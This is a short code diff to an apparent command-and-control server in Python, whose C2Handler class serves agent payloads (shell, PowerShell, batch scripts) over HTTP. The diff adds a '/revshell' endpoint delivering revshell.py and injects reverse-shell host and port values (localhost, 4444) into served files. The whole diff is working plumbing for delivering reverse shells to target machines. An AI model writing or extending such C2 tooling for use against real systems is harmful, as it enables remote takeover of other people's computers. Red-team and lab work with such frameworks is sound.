@@ -11,6 +11,7 @@ AGENT_ENDPOINTS = {
     "/sh": ("agent.sh", "text/x-shellscript"),
     "/ps1": ("agent.ps1", "application/x-powershell"),
     "/bat": ("agent.bat", "application/x-bat"),
+    "/revshell": ("revshell.py", "text/x-python"),
 }
 
 
@@ -26,6 +27,8 @@ class C2Handler(BaseHTTPRequestHandler):
     log_buffer = None
     server_url = "http://localhost:8080"
     server_token = ""
+    server_rs_host = "localhost"
+    server_rs_port = "4444"
 
     def _check_token(self, token):
         expected = type(self).server_token
@@ -68,6 +71,8 @@ class C2Handler(BaseHTTPRequestHandler):
             content = f.read()
         content = content.replace("__C2_URL__", type(self).server_url)
         content = content.replace("__C2_TOKEN__", type(self).server_token)
+        content = content.replace("__C2_RS_HOST__", type(self).server_rs_host)
+        content = content.replace("__C2_RS_PORT__", type(self).server_rs_port)
         body = content.encode()
         self.send_response(200)
         self.send_header("Content-Type", mime)
